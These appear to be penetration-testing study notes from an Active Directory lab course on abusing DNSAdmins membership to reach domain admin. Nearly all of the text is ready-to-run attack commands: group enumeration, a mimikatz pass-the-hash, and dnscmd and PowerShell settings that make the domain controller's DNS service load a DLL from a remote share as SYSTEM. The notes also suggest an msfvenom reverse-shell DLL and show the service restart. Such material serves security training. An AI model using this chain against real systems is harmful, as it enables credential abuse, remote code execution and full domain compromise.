It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).

In case the DC also serves as DNS, this will provide us escalation to DA.

Need privileges to restart the DNS service.

-Enumerate the members of the DNSAdmins group

Get-NetGroupMember -GroupName "DNSAdmins"

-in this case srvadmin is part of the DNSAdmins group, passing the hash to get his privs:

sekurlsa::pth /User:srvadmin /ntlm:hash /domain:dollarcorp.moneycorp.local /run:powershell.exe

-From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSTA DNS):

dnscmd dcorp-dc /config /serverlevelplugindll \\localip\dll\mimilib.dll

you can craft a malicious reverse shell dll with msfvenom

*--Using DNSServer module (needs RSAT DNS):
	$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All
	$dnsettings.ServerLevelPluginDll - "\\localip\dll\mimilib.dll"
	Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose

*MAKE THE DLL DIRECTORY READABLE AND WRITABLE BY EVERYONE! (USE THE GUI)

-Restart the DNS service (assuming that the DNSAdmins group has the permission to do so):
cmd
sc \\dcorp-dc stop dns
sc \\dcorp-dc start dns

*By default, the mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log
